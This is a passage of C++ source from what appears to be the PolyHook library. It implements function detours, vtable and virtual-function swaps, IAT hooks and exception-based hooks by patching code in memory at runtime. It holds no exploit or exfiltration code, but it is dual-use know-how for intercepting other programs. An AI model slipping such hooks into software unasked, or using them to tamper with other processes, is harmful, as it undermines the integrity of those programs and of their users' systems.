			the compiler to optimize the lambda into a function pointer rather than constructing
			an anonymous class and incur the extra overhead that involves (negligible overhead but why not optimize)*/
			auto Incrementor = [](int_fast64_t Delta,MEMORY_BASIC_INFORMATION& mbi) -> uintptr_t{
				if (Delta > 0)
					return (uintptr_t)mbi.BaseAddress + mbi.RegionSize;
				else
					return (uintptr_t)mbi.BaseAddress - 1; //TO-DO can likely jump much more than 1 byte, figure out what the max is
			};

			auto Comparator = [](long long int Delta,uintptr_t Addr, uintptr_t End)->bool {
				if (Delta > 0)
					return Addr < End;
				else
					return Addr > End;
			};

			//Start at pStart, search 2GB around it (up/down depending on Delta)
			MEMORY_BASIC_INFORMATION mbi;
			for (uintptr_t Addr = (uintptr_t)pStart; Comparator(Delta,Addr, (uintptr_t)pStart + Delta); Addr = Incrementor(Delta,mbi))
			{
				if (!VirtualQuery((LPCVOID)Addr, &mbi, sizeof(mbi)))
					break;

				assert(mbi.RegionSize != 0);

				if (mbi.State != MEM_FREE)
					continue;

				//VirtualAlloc requires 64k aligned addresses
				void* PageBase = (uint8_t*)mbi.BaseAddress - LOWORD(mbi.BaseAddress);
				if (void* Allocated = (uint8_t*)VirtualAlloc(PageBase, Size, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE))
					return Allocated;
			}
			return nullptr;
		}

		inline void* AllocateWithin2GB(uint8_t* pStart, size_t Size, size_t& AllocationDelta)
		{
			static const size_t MaxAllocationDelta = 0x80000000; //2GB

			//Attempt to allocate +-2GB from pStart
			AllocationDelta = 0;
			void* Allocated = nullptr;
			Allocated = Tools::Allocate_2GB_IMPL(pStart, Size, (~MaxAllocationDelta) + 1); //Search down first (-2GB) 

			//If search down found nothing
			if (Allocated == nullptr)
				Allocated = Tools::Allocate_2GB_IMPL(pStart, Size, MaxAllocationDelta); //Search up (+2GB)
	
			//Sanity check the delta is less than 2GB
			if (Allocated != nullptr)
			{
				AllocationDelta = std::abs(pStart - Allocated);
				if (AllocationDelta > MaxAllocationDelta)
				{
					//Out of range, free then return
					VirtualFree(Allocated, 0, MEM_RELEASE);
					return nullptr;
				}
			}
			return Allocated;
		}
	}

	class ASMHelper
	{
	public:
		enum DISP
		{
			D_INT64 = 8,
			D_INT32 = 4,
			D_INT16 = 2,
			D_INT8 = 1,
			D_INVALID = -1
		};
		DISP GetDisplacementType(const uint8_t DispVal)
		{
			switch (DispVal)
			{
			case 1:
				return DISP::D_INT8;
			case 2:
				return DISP::D_INT16;
			case 4:
				return DISP::D_INT32;
			case 8:
				return DISP::D_INT64;
			default:
				return DISP::D_INVALID;
			}
		}
		bool IsConditionalJump(const uint8_t* bytes,const uint16_t Size)
		{
			//http://unixwiz.net/techtips/x86-jumps.html
			if (Size < 1)
				return false;

			if (bytes[0] == 0x0F && Size > 1)
			{
				if (bytes[1] >= 0x80 && bytes[1] <= 0x8F)
					return true;
			}

			if (bytes[0] >= 0x70 && bytes[0] <= 0x7F)
				return true;

			if (bytes[0] == 0xE3)
				return true;

			return false;
		}

		template<typename T>
		T GetDisplacement(uint8_t* Instruction, const uint32_t Offset)
		{
			T Disp;
			memset(&Disp, 0x00, sizeof(T));
			memcpy(&Disp, &Instruction[Offset], sizeof(T));
			return Disp;
		}
	};

	class RuntimeError
	{
	public:
		enum class Severity
		{
			Warning, //Might have an issue
			Critical, //Definitely have an issue, but it's not serious
			UnRecoverable, //Definitely have an issue, it's serious
			NoError //Default
		};
		RuntimeError();
		RuntimeError(Severity Sev, const std::string& Msg);
		virtual ~RuntimeError() = default;
		const Severity GetSeverity() const;
		const std::string GetString() const;
	private:
		Severity m_Severity;
		std::string m_Message;
	};

	enum class HookType
	{
		X86Detour,
		X64Detour,
		VFuncSwap,
		VFuncDetour,
		VTableSwap,
		IAT,
		VEH,
		UNKNOWN
	};
	class IHook
	{
	public:
		IHook() = default;
		IHook(IHook&& other) = default; //move
		IHook& operator=(IHook&& other) = default;//move assignment
		IHook(const IHook& other) = delete; //copy
		IHook& operator=(const IHook& other) = delete; //copy assignment
		virtual ~IHook() = default;

		virtual bool Hook() = 0;
		virtual void UnHook() = 0;
		virtual HookType GetType() = 0;

		virtual RuntimeError GetLastError() const;
		virtual void PrintError(const RuntimeError& Err) const;
	protected:
		virtual void PostError(const RuntimeError& Err);

		RuntimeError m_LastError;
	};

	class AbstractDetour :public IHook
	{
	public:
		AbstractDetour();
		AbstractDetour(const AbstractDetour& other) = delete;
		AbstractDetour& operator=(const AbstractDetour& other) = delete;
		virtual ~AbstractDetour();

		template<typename T>
		void SetupHook(T* Src, T* Dest)
		{
			SetupHook((uint8_t*)Src, (uint8_t*)Dest);
		}
		void SetupHook(uint8_t* Src, uint8_t* Dest);

		virtual void UnHook() override;

		template<typename T>
		T GetOriginal()
		{
			return (T)m_Trampoline;
		}
	protected:
		template<typename T>
		T CalculateRelativeDisplacement(uintptr_t From,uintptr_t To, uint_fast32_t InsSize)
		{
			if (To < From)
				return 0 - (From - To) - InsSize;
			return To - (From + InsSize);
		}
		uint_fast32_t CalculateLength(uint8_t* Src, uint_fast32_t NeededLength);
		void RelocateASM(uint8_t* Code, uint_fast32_t* CodeSize, const uintptr_t From, const uintptr_t To);
		void _Relocate(cs_insn* CurIns, const uintptr_t From, const uintptr_t To, const uint8_t DispSize, const uint8_t DispOffset);
		void RelocateConditionalJMP(cs_insn* CurIns, uint_fast32_t* CodeSize, const uintptr_t From, const uintptr_t To, const uint8_t DispSize, const uint8_t DispOffset);
		virtual x86_reg GetIpReg() = 0;
		virtual void FreeTrampoline() = 0;
		virtual void WriteJMP(uintptr_t From, uintptr_t To) = 0;
		virtual int GetJMPSize() = 0;
		void FlushSrcInsCache();
		void Initialize(cs_mode Mode);
		csh m_CapstoneHandle;
		ASMHelper m_ASMInfo;

		uint8_t m_OriginalCode[64];
		uint_fast32_t m_OriginalLength;
		uint8_t* m_Trampoline;
		bool m_NeedFree;
		bool m_Hooked;
		uint8_t* m_hkSrc;
		uint8_t* m_hkDest;
		uint_fast32_t m_hkLength;
		cs_mode m_CapMode;
	};

#ifndef _WIN64
#define Detour X86Detour
	//x86 5 Byte Detour
	class X86Detour :public AbstractDetour
	{
	public:
		friend class VFuncDetour;
		X86Detour();
		X86Detour(X86Detour&& other) = default; //move
		X86Detour& operator=(X86Detour&& other) = default;//move assignment
		X86Detour(const X86Detour& other) = delete; //copy
		X86Detour& operator=(const X86Detour& other) = delete; //copy assignment
		virtual ~X86Detour();

		virtual bool Hook() override;
		virtual HookType GetType() override;
	protected:
		virtual x86_reg GetIpReg() override;
		virtual void FreeTrampoline();
		virtual void WriteJMP(uintptr_t From, uintptr_t To);
		virtual int GetJMPSize();
	private:
		void WriteRelativeJMP(uintptr_t Destination, uintptr_t JMPDestination);
		void WriteAbsoluteJMP(uintptr_t Destination, uintptr_t JMPDestination);
	};
#else
#define Detour X64Detour
	//X64 6 Byte Detour
	class X64Detour :public AbstractDetour
	{
	public:
		friend class VFuncDetour;
		//Credits DarthTon, evolution536
		X64Detour();
		X64Detour(X64Detour&& other) = default; //move
		X64Detour& operator=(X64Detour&& other) = default;//move assignment
		X64Detour(const X64Detour& other) = delete; //copy
		X64Detour& operator=(const X64Detour& other) = delete; //copy assignment
		virtual ~X64Detour();

		virtual bool Hook() override;
		virtual HookType GetType() override;
	protected:
		virtual x86_reg GetIpReg() override;
		virtual void FreeTrampoline() override;
		virtual void WriteJMP(const uintptr_t From,const uintptr_t To) override;
		virtual int GetJMPSize() override;
	private:
		void WriteAbsoluteJMP(const uintptr_t Destination,const uintptr_t JMPDestination);
	};
#endif //END _WIN64 IFDEF

	//Swap Virtual Function Pointer to Destination
	class VFuncSwap : public IHook
	{
	public:
		VFuncSwap();
		VFuncSwap(VFuncSwap&& other) = default;
		VFuncSwap& operator=(VFuncSwap&& other) = default;
		VFuncSwap(const VFuncSwap& other) = delete;
		VFuncSwap& operator=(const VFuncSwap& other) = delete;
		virtual ~VFuncSwap();

		virtual bool Hook() override;
		virtual void UnHook() override;
		virtual HookType GetType() override;

		void SetupHook(uint8_t** Vtable, const uint_fast16_t Index, uint8_t* Dest);
		template<typename T>
		T GetOriginal()
		{
			return (T)m_OrigVFunc;
		}
	private:
		uint8_t** m_hkVtable;
		uint8_t* m_hkDest;
		uint8_t* m_OrigVFunc;
		uint_fast16_t m_hkIndex;
		bool m_Hooked;
	};

	//Detour the Function the VTable Points to
	class VFuncDetour :public IHook
	{
	public:
		VFuncDetour();
		VFuncDetour(VFuncDetour&& other) = default; //move
		VFuncDetour& operator=(VFuncDetour&& other) = default;//move assignment
		VFuncDetour(const VFuncDetour& other) = delete; //copy
		VFuncDetour& operator=(const VFuncDetour& other) = delete; //copy assignment
		virtual ~VFuncDetour();

		virtual bool Hook() override;
		virtual void UnHook() override;
		virtual HookType GetType() override;

		void SetupHook(uint8_t** Vtable, const uint_fast16_t Index, uint8_t* Dest);
		template<typename T>
		T GetOriginal()
		{
			return m_Detour->GetOriginal<T>();
		}
		virtual RuntimeError GetLastError() const override;
	protected:
		virtual void PostError(const RuntimeError& Err) override;
	private:
		std::unique_ptr<Detour> m_Detour;
		/*We don't need an m_Hooked bool because this 
		detour object above handles the unhook on destruction by itself*/
	};

	//Credit to Dogmatt on unknowncheats.me for IsValidPtr
#ifdef _WIN64
#define _PTR_MAX_VALUE ((void*)0x000F000000000000)
#else
#define _PTR_MAX_VALUE ((void*)0xFFF00000)
#endif
	inline bool IsValidPtr(void* p) { return (p >= (void*)0x10000) && (p < _PTR_MAX_VALUE) && p != nullptr; }

	class VTableSwap : public IHook
	{
	public:
		VTableSwap();
		VTableSwap(VTableSwap&& other) = default; //move
		VTableSwap& operator=(VTableSwap&& other) = default;//move assignment
		VTableSwap(const VTableSwap& other) = delete; //copy
		VTableSwap& operator=(const VTableSwap& other) = delete; //copy assignment
		virtual ~VTableSwap();

		virtual bool Hook() override;
		virtual HookType GetType() override;

		template<typename T>
		T HookAdditional(const uint_fast16_t Index, uint8_t* Dest)
		{
			//The makes sure we called Hook first
			if (!m_NeedFree)
				return nullptr;

			m_NewVtable[Index] = Dest;
			return (T)m_OrigVtable[Index];
		}
		virtual void UnHook() override;
		void SetupHook(uint8_t* pClass, const uint_fast16_t Index, uint8_t* Dest);
		template<typename T>
		T GetOriginal()
		{
			return (T)m_hkOriginal;
		}
	private:
		uint_fast16_t GetVFuncCount(uint8_t** pVtable);
		void FreeNewVtable();
		uint8_t** m_NewVtable;
		uint8_t** m_OrigVtable;
		uint8_t*** m_phkClass;
		uint8_t*  m_hkDest;
		uint8_t*  m_hkOriginal;
		uint_fast16_t    m_hkIndex;
		uint_fast16_t    m_VFuncCount;
		bool m_NeedFree;
		bool m_Hooked;
	};

#define ResolveRVA(base,rva) (( (uint8_t*)base) +rva)
	class IATHook:public IHook
	{
	public:
		IATHook();
		IATHook(IATHook&& other) = default; //move
		IATHook& operator=(IATHook&& other) = default;//move assignment
		IATHook(const IATHook& other) = delete; //copy
		IATHook& operator=(const IATHook& other) = delete; //copy assignment
		virtual ~IATHook();

		virtual bool Hook() override;
		virtual void UnHook() override;
		virtual HookType GetType() override;

		template<typename T>
		T GetOriginal()
		{
			return (T)m_pIATFuncOrig;
		}
		void SetupHook(const char* LibraryName,const char* SrcFunc, uint8_t* Dest,const char* Module = "");
	private:
		bool FindIATFunc(const char* LibraryName,const char* FuncName,PIMAGE_THUNK_DATA* pFuncThunkOut,const char* Module = "");
		std::string m_hkSrcFunc;
		std::string m_hkLibraryName;
		std::string m_hkModuleName;
		uint8_t* m_hkDest;
		void* m_pIATFuncOrig;
		bool m_Hooked;
	};

	template<typename Func>
	class FinalAction {
	public:
		FinalAction(Func f) :FinalActionFunc(std::move(f)) {}
		~FinalAction()
		{
			FinalActionFunc();
		}
	private:
		Func FinalActionFunc;

		/*Uses RAII to call a final function on destruction
		C++ 11 version of java's finally (kindof)*/
	};

	template <typename F>
	FinalAction<F> finally(F f) {
		return FinalAction<F>(f);
	}

	class MemoryProtect
	{
	public:
		MemoryProtect(void* Address, size_t Size, DWORD ProtectionFlags);
		~MemoryProtect();
	private:
		bool Protect(void* Address, size_t Size, DWORD ProtectionFlags);
		void* m_Address;
		size_t m_Size;
		DWORD m_Flags;
		DWORD m_OldProtection;
	};

	class VEHHook : public IHook
	{
	public:
		enum class VEHMethod
		{
			INT3_BP,
			HARDWARE_BP,
			GUARD_PAGE,
			ERROR_TYPE
		};
		VEHHook();
		VEHHook(VEHHook&& other) = default; //move
		VEHHook& operator=(VEHHook&& other) = default;//move assignment
		VEHHook(const VEHHook& other) = delete; //copy
		VEHHook& operator=(const VEHHook& other) = delete; //copy assignment
		virtual ~VEHHook();

		virtual bool Hook() override;
		virtual void UnHook() override;
		virtual HookType GetType() override;

		template<typename T>
		T GetOriginal()
		{
			return (T)m_ThisCtx.m_Src;
		}
		void SetupHook(uint8_t* Src, uint8_t* Dest, VEHMethod Method);

		auto GetProtectionObject()
		{
			//Return an object to restore INT3_BP after callback is done
			return finally([&]() {
				if (m_ThisCtx.m_Type == VEHMethod::INT3_BP)
				{
					MemoryProtect Protector(m_ThisCtx.m_Src, 1, PAGE_EXECUTE_READWRITE);
					*m_ThisCtx.m_Src = 0xCC;
				}else if (m_ThisCtx.m_Type == VEHMethod::GUARD_PAGE) {
					DWORD OldProtection;
					VirtualProtect(m_ThisCtx.m_Src, 1, PAGE_EXECUTE_READWRITE | PAGE_GUARD, &OldProtection);
				}
			});
		}
	protected:
		struct HookCtx {
			VEHMethod m_Type;
			uint8_t* m_Src;
			uint8_t* m_Dest;
			uint8_t m_StorageByte;
			/*Different methods store different things in this byte,
			INT3_BP = hold the byte overwritten
			HARDWARE_BP = the index of the debug register we used
			GUARD_PAGE = unused*/

			HookCtx(uint8_t* Src, uint8_t* Dest, VEHMethod Method)
			{
				m_Dest = Dest;
				m_Src = Src;
				m_Type = Method;
			}

			HookCtx()
			{
				m_Type = VEHMethod::ERROR_TYPE;
			}

			friend bool operator==(const HookCtx& Ctx1, const HookCtx& Ctx2)
			{
				if (Ctx1.m_Dest == Ctx2.m_Dest && Ctx1.m_Src == Ctx2.m_Src && Ctx1.m_Type == Ctx2.m_Type)
					return true;
				return false;
			}
		};
	private:
		static bool AreInSamePage(const uint8_t* Addr1,const uint8_t* Addr2);
		static LONG CALLBACK VEHHandler(EXCEPTION_POINTERS* ExceptionInfo);
		static std::vector<HookCtx> m_HookTargets;
		static std::mutex m_TargetMutex;
		HookCtx m_ThisCtx;
		DWORD m_PageSize;
		bool m_Hooked;
	};
}


////////////////////////////////BEGIN IMPLEMENTATION////////////////////////////////
/*Until C++xy release modules I will keep the implementation in the header. This is
a design decision to make it easier for a user to include PolyHook. Since polyhook
relies on capstone, which requires .lib and .h files of it's own, i want to avoid
compiling polyhook into a .lib. This way a user simply includes polyhook.h, and sets
their dependency directories to point to capstone. If compilation speed is an issue
it is trivial to separate the implementation by manually C&P-ing the below lines
into a seperate .cpp.*/

PLH::RuntimeError::RuntimeError()
{
	m_Message = "";
	m_Severity = Severity::NoError;
}

PLH::RuntimeError::RuntimeError(Severity Sev, const std::string& Msg)
{
	m_Severity = Sev;
	m_Message = Msg;
}

const std::string PLH::RuntimeError::GetString() const
{
	return m_Message;
}

const PLH::RuntimeError::Severity PLH::RuntimeError::GetSeverity() const
{
	return m_Severity;
}

void PLH::IHook::PostError(const RuntimeError& Err)
{
	m_LastError = Err;
	PLH::Tools::XTrace("Posted Error [SEVERITY:%d]:\n"
		"%s\n", Err.GetSeverity(), Err.GetString().c_str());
}

void PLH::IHook::PrintError(const RuntimeError& Err) const
{
	std::string Severity = "";
	switch (Err.GetSeverity())
	{
	case PLH::RuntimeError::Severity::Warning:
		Severity = "Warning";
		break;
	case PLH::RuntimeError::Severity::Critical:
		Severity = "Critical";
		break;
	case PLH::RuntimeError::Severity::UnRecoverable:
		Severity = "UnRecoverable";
		break;
	case PLH::RuntimeError::Severity::NoError:
		Severity = "No Error";
		break;
	default:
		Severity = "Unknown";
	}
	PLH::Tools::XTrace("SEVERITY:[%s] %s\n", Severity.c_str(),
		Err.GetString().c_str());
}

PLH::RuntimeError PLH::IHook::GetLastError() const
{
	return m_LastError;
}

PLH::AbstractDetour::AbstractDetour() :IHook(), m_NeedFree(false), m_Hooked(false)
{
#ifdef _WIN64
	Initialize(CS_MODE_64);
#else
	Initialize(CS_MODE_32);
#endif // _WIN64
}

PLH::AbstractDetour::~AbstractDetour()
{
	cs_close(&m_CapstoneHandle);
}

void PLH::AbstractDetour::SetupHook(uint8_t* Src, uint8_t* Dest)
{
	m_hkSrc = Src;
	m_hkDest = Dest;
}

void PLH::AbstractDetour::UnHook()
{
	MemoryProtect Protector(m_hkSrc, m_hkLength, PAGE_EXECUTE_READWRITE);
	memcpy(m_hkSrc, m_OriginalCode, m_OriginalLength); //Copy original from trampoline back to src
	FlushSrcInsCache();
	FreeTrampoline();
	m_Hooked = false;
}

uint_fast32_t PLH::AbstractDetour::CalculateLength(uint8_t* Src, uint_fast32_t NeededLength)
{
	//Grab First 100 bytes of function, disasm until invalid instruction
	cs_insn* InstructionInfo;
	size_t InstructionCount = cs_disasm(m_CapstoneHandle, Src, 0x100, (uintptr_t)Src, 0, &InstructionInfo);

	//Loop over instructions until we have at least NeededLength's Size
	PLH::Tools::XTrace("\nORIGINAL:\n");
	uint_fast32_t InstructionSize = 0;
	bool BigEnough = false;
	for (uint_fast32_t i = 0; i < InstructionCount && !BigEnough; i++)
	{
		cs_insn* CurIns = (cs_insn*)&InstructionInfo[i];
		InstructionSize += CurIns->size;
		if (InstructionSize >= NeededLength)
			BigEnough = true;

		PLH::Tools::XTrace("%I64X [%d]: ", CurIns->address, CurIns->size);
		for (uint_fast32_t j = 0; j < CurIns->size; j++)
			PLH::Tools::XTrace("%02X ", CurIns->bytes[j]);
		PLH::Tools::XTrace("%s %s\n", CurIns->mnemonic, CurIns->op_str);
	}
	if (!BigEnough)
		InstructionSize = 0;

	cs_free(InstructionInfo, InstructionCount);
	return InstructionSize;
}

void PLH::AbstractDetour::RelocateASM(uint8_t* Code, uint_fast32_t* CodeSize, const uintptr_t From, const uintptr_t To)
{
	cs_insn* InstructionInfo;
	size_t InstructionCount = cs_disasm(m_CapstoneHandle, Code, *CodeSize, (uintptr_t)Code, 0, &InstructionInfo);

	PLH::Tools::XTrace("\nTrampoline:\n");
	for (uint_fast32_t i = 0; i < InstructionCount; i++)
	{
		cs_insn* CurIns = (cs_insn*)&InstructionInfo[i];
		cs_x86* x86 = &(CurIns->detail->x86);

		PLH::Tools::XTrace("%I64X: ", CurIns->address);
		for (uint_fast32_t j = 0; j < CurIns->size; j++)
			PLH::Tools::XTrace("%02X ", CurIns->bytes[j]);
		PLH::Tools::XTrace("%s %s\n", CurIns->mnemonic, CurIns->op_str);

		for (uint_fast32_t j = 0; j < x86->op_count; j++)
		{
			cs_x86_op* op = &(x86->operands[j]);
			if (op->type == X86_OP_MEM)
			{
				//MEM are types like lea rcx,[rip+0xdead]
				if (op->mem.base == X86_REG_INVALID)
					continue;

				//Are we relative to instruction pointer?
				if (op->mem.base != GetIpReg())
					continue;

				_Relocate(CurIns, From, To, x86->offsets.displacement_size, x86->offsets.displacement_offset);
			}
			else if (op->type == X86_OP_IMM) {
				//IMM types are like call 0xdeadbeef
				if (x86->op_count > 1) //exclude types like sub rsp,0x20
					continue;

				char* mnemonic = CurIns->mnemonic;
				if (m_ASMInfo.IsConditionalJump(CurIns->bytes, CurIns->size))
				{
					RelocateConditionalJMP(CurIns, CodeSize, From, To, x86->offsets.imm_size, x86->offsets.imm_offset);
					continue;
				}

				//types like push 0x20 slip through, check mnemonic
				if (strcmp(mnemonic, "call") != 0 && strcmp(mnemonic, "jmp") != 0) //probably more types than just these, update list as they're found
					continue;

				_Relocate(CurIns, From, To, x86->offsets.imm_size, x86->offsets.imm_offset);
			}
		}
	}

	PLH::Tools::XTrace("\nFixed Trampoline\n");
	InstructionCount = cs_disasm(m_CapstoneHandle, Code, *CodeSize, (uint64_t)Code, 0, &InstructionInfo);
	for (int i = 0; i < InstructionCount; i++)
	{
		cs_insn* CurIns = (cs_insn*)&InstructionInfo[i];

		PLH::Tools::XTrace("%I64X: ", CurIns->address);
		for (int j = 0; j < CurIns->size; j++)
			PLH::Tools::XTrace("%02X ", CurIns->bytes[j]);
		PLH::Tools::XTrace("%s %s\n", CurIns->mnemonic, CurIns->op_str);
	}
	cs_free(InstructionInfo, InstructionCount);
}

void PLH::AbstractDetour::_Relocate(cs_insn* CurIns, const uintptr_t From, const uintptr_t To, const uint8_t DispSize, const uint8_t DispOffset)
{
	PLH::Tools::XTrace("Relocating...\n");

	ASMHelper::DISP DispType = m_ASMInfo.GetDisplacementType(DispSize);
	if (DispType == ASMHelper::DISP::D_INT8)
	{
		int8_t Disp = m_ASMInfo.GetDisplacement<int8_t>(CurIns->bytes, DispOffset);
		Disp -= (To - From);
		*(int8_t*)(CurIns->address + DispOffset) = Disp;
	}
	else if (DispType == ASMHelper::DISP::D_INT16) {
		int16_t Disp = m_ASMInfo.GetDisplacement<int16_t>(CurIns->bytes, DispOffset);
		Disp -= (To - From);
		*(int16_t*)(CurIns->address + DispOffset) = Disp;
	}
	else if (DispType == ASMHelper::DISP::D_INT32) {
		int32_t Disp = m_ASMInfo.GetDisplacement<int32_t>(CurIns->bytes, DispOffset);
		Disp -= (To - From);
		*(int32_t*)(CurIns->address + DispOffset) = Disp;
	}
}

void PLH::AbstractDetour::FlushSrcInsCache()
{
	/*This method is just a precaution, on x86/x64 it is usually a no-op,
	on other platforms it may be required (ARM i believe?)*/

	//Flush overwritten original
	FlushInstructionCache(GetCurrentProcess(), m_hkSrc, m_OriginalLength);

	//Flush trampoline
	FlushInstructionCache(GetCurrentProcess(), m_Trampoline, m_hkLength);
}

void PLH::AbstractDetour::Initialize(cs_mode Mode)
{
	if (cs_open(CS_ARCH_X86, Mode, &m_CapstoneHandle) != CS_ERR_OK)
		PLH::Tools::XTrace("Error Initializing Capstone x86\n");

	cs_option(m_CapstoneHandle, CS_OPT_DETAIL, CS_OPT_ON);
}

void PLH::AbstractDetour::RelocateConditionalJMP(cs_insn* CurIns, uint_fast32_t* CodeSize, const uintptr_t From, const uintptr_t To, const uint8_t DispSize, const uint8_t DispOffset)
{
	/*This function automatically begins to build a jump table at the end of the trampoline to allow relative jumps to function properly:
	-Changes relative jump to point to an absolute jump
	-Absolute jump then does the long distance to jump to where the relative jump originally went
	*/
	ASMHelper::DISP DispType = m_ASMInfo.GetDisplacementType(DispSize);
	uintptr_t TrampolineEnd = To + (*CodeSize);
	if (DispType == ASMHelper::DISP::D_INT8)
	{
		int8_t Disp = m_ASMInfo.GetDisplacement<int8_t>(CurIns->bytes, DispOffset);
		uintptr_t OriginalDestination = CurIns->address + (Disp - (To - From)) + CurIns->size;
		WriteJMP(TrampolineEnd, OriginalDestination);
		Disp = CalculateRelativeDisplacement<int8_t>(CurIns->address, TrampolineEnd, CurIns->size); //set relative jmp to go to our absolute
		*(int8_t*)(CurIns->address + DispOffset) = Disp;
		(*CodeSize) += GetJMPSize();
	}
	else if (DispType == ASMHelper::DISP::D_INT16) {
		int16_t Disp = Disp = m_ASMInfo.GetDisplacement<int16_t>(CurIns->bytes, DispOffset);
		uintptr_t OriginalDestination = CurIns->address + (Disp - (To - From)) + CurIns->size;
		WriteJMP(TrampolineEnd, OriginalDestination);
		Disp = CalculateRelativeDisplacement<int16_t>(CurIns->address, TrampolineEnd, CurIns->size);
		*(int16_t*)(CurIns->address + DispOffset) = Disp;
		(*CodeSize) += GetJMPSize();
	}
	else if (DispType == ASMHelper::DISP::D_INT32) {
		int32_t Disp = Disp = m_ASMInfo.GetDisplacement<int32_t>(CurIns->bytes, DispOffset);
		uintptr_t OriginalDestination = CurIns->address + (Disp - (To - From)) + CurIns->size;
		WriteJMP(TrampolineEnd, OriginalDestination);
		Disp = CalculateRelativeDisplacement<int32_t>(CurIns->address, TrampolineEnd, CurIns->size);
		*(int32_t*)(CurIns->address + DispOffset) = Disp;
		(*CodeSize) += GetJMPSize();
	}
}

/*----------------------------------------------*/
#ifndef _WIN64
PLH::X86Detour::X86Detour() : AbstractDetour()
{

}

PLH::X86Detour::~X86Detour()
{
	if (m_Hooked)
		UnHook();

	if (m_NeedFree)
		FreeTrampoline();
}

PLH::HookType PLH::X86Detour::GetType()
{
	return PLH::HookType::X86Detour;
}

bool PLH::X86Detour::Hook()
{
	DWORD OldProtection;

	m_hkLength = CalculateLength(m_hkSrc, 5);
	m_OriginalLength = m_hkLength;
	if (m_hkLength == 0)
	{
		PLH::Tools::XTrace("Function to small to hook\n");
		return false;
	}

	//TODO: Add single step support in case processes EIP is on/in the section we write to
	Tools::ThreadManager ThreadMngr;
	ThreadMngr.SuspendThreads();

	m_Trampoline = new uint8_t[m_hkLength + 30];   //Allocate Space for original plus extra to jump back and for jmp table
	m_NeedFree = true;
	VirtualProtect(m_Trampoline, m_hkLength + 30, PAGE_EXECUTE_READWRITE, &OldProtection); //Allow Execution

	memcpy(m_OriginalCode, m_hkSrc, m_hkLength);
	memcpy(m_Trampoline, m_hkSrc, m_hkLength); //Copy original into allocated space
	WriteAbsoluteJMP((uintptr_t)&m_Trampoline[m_hkLength], (uintptr_t)m_hkSrc + m_hkLength); //JMP back to original code, use absolute so we don't accidentally relocate it
	m_hkLength += 6; //Size of above jump
	RelocateASM(m_Trampoline, &m_hkLength, (uintptr_t)m_hkSrc, (uintptr_t)m_Trampoline);

	//Change protection to allow write on original function
	MemoryProtect Protector(m_hkSrc, m_hkLength, PAGE_EXECUTE_READWRITE);
	//Encode Jump from Hooked Function to the Destination function
	WriteRelativeJMP((uintptr_t)m_hkSrc, (uintptr_t)m_hkDest);

	//Write nops over bytes of overwritten instructions
	for (uint_fast16_t i = 5; i < m_OriginalLength; i++)
		m_hkSrc[i] = 0x90;

	ThreadMngr.ResumeThreads();
	FlushSrcInsCache();
	m_Hooked = true;
	PostError(RuntimeError(RuntimeError::Severity::Warning, "PolyHook x86Detour: Some opcodes may not be relocated properly"));
	return true;
	/*Original
	-JMP Destination
	-NOP (extends to length of overwritten opcode)
	-Rest of function

	Destination
	-Do your shit
	-Return Trampoline (goes to trampoline)

	Trampoline
	-Execute Overwritten Opcodes
	-Patch original relative jmps to point to jump table (JE Jumptable entry 1)
	-JMP to rest of function (in original)
	-*BEGIN JUMPTABLE*     <- Allows relative conditional jumps to point back to their original location
	-1)JMP to location of relative jmp one
	-2)JMP to location of relative jmp two
	-2)...continue pattern for all relative jmps
	*/
}

x86_reg PLH::X86Detour::GetIpReg()
{
	return X86_REG_EIP;
}

void PLH::X86Detour::FreeTrampoline()
{
	if (m_NeedFree)
	{
		delete[] m_Trampoline;
		m_NeedFree = false;
	}
}

void PLH::X86Detour::WriteAbsoluteJMP(const uintptr_t Destination, const uintptr_t JMPDestination)
{
	/*
	push <addr>
	ret
	*/
	uint8_t detour[] = { 0x68, 0xCC, 0xCC, 0xCC, 0xCC, 0xC3 };
	memcpy((uint8_t*)Destination, detour, sizeof(detour));
	*(uintptr_t*)&((uint8_t*)Destination)[1] = JMPDestination;
}

void PLH::X86Detour::WriteRelativeJMP(const uintptr_t Destination, const uintptr_t JMPDestination)
{
	*(uint8_t*)Destination = 0xE9;       //Write jump opcode to jump back to non overwritten code
	*(long*)(Destination + 1) = CalculateRelativeDisplacement<long>(Destination, JMPDestination, 5);
}

void PLH::X86Detour::WriteJMP(const uintptr_t From, const uintptr_t To)
{
	WriteRelativeJMP(From, To);
}

int PLH::X86Detour::GetJMPSize()
{
	return 5;
}
#else
PLH::X64Detour::X64Detour() :AbstractDetour()
{

}

PLH::X64Detour::~X64Detour()
{
	if (m_Hooked)
		UnHook();

	if (m_NeedFree)
		FreeTrampoline();
}

PLH::HookType PLH::X64Detour::GetType()
{
	return PLH::HookType::X64Detour;
}

bool PLH::X64Detour::Hook()
{
	//Allocate Memory as close as possible to src, to minimize chance 32bit displacements will be out of range (for relative jmp type)
	size_t AllocDelta = 0;
	m_Trampoline = (uint8_t*)Tools::AllocateWithin2GB(m_hkSrc, 0x1000, AllocDelta);
	if (m_Trampoline == nullptr)
	{
		PostError(RuntimeError(RuntimeError::Severity::Critical, "PolyHook x64Detour: Could not allocate within +-2GB...Falling Back to any location"));
		m_Trampoline = (uint8_t*)VirtualAlloc(0, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		if (m_Trampoline == nullptr)
			return false;
	}
	else {
		//Just some debug output
		double DeltaInGB = AllocDelta / 1000000000.0; //How far was our trampoline allocated from the target, in GB
		double DeltaPercentage = DeltaInGB / .5 * 100.0; //Allowed range is +-2GB, see in percentage how close to tolerance we were
		PLH::Tools::XTrace("PolyHook x64Detour: Allocation within +-2GB Succeeded Delta:[%f GB] Percent Tolerance Used[%f %% out of 2GB]\n", DeltaInGB, DeltaPercentage);
	}
	m_NeedFree = true;

	//Decide which jmp type to use based on function size
	bool UseRelativeJmp = false;
	m_hkLength = CalculateLength(m_hkSrc, 16); //More stable 16 byte jmp
	m_OriginalLength = m_hkLength; //We modify hkLength in Relocation routine
	if (m_hkLength == 0)
	{
		UseRelativeJmp = true;
		m_hkLength = CalculateLength(m_hkSrc, 6); //Smaller, less safe 6 byte (jmp could be out of bounds)
		if (m_hkLength == 0)
		{
			PostError(RuntimeError(RuntimeError::Severity::UnRecoverable, "PolyHook x64Detour: Function to small to hook"));
			return false;
		}
	}
	//TO-DO: Add single step support in case processes RIP is on/in the section we write to
	Tools::ThreadManager ThreadMngr;
	ThreadMngr.SuspendThreads();

	memcpy(m_OriginalCode, m_hkSrc, m_hkLength);
	memcpy(m_Trampoline, m_hkSrc, m_hkLength);
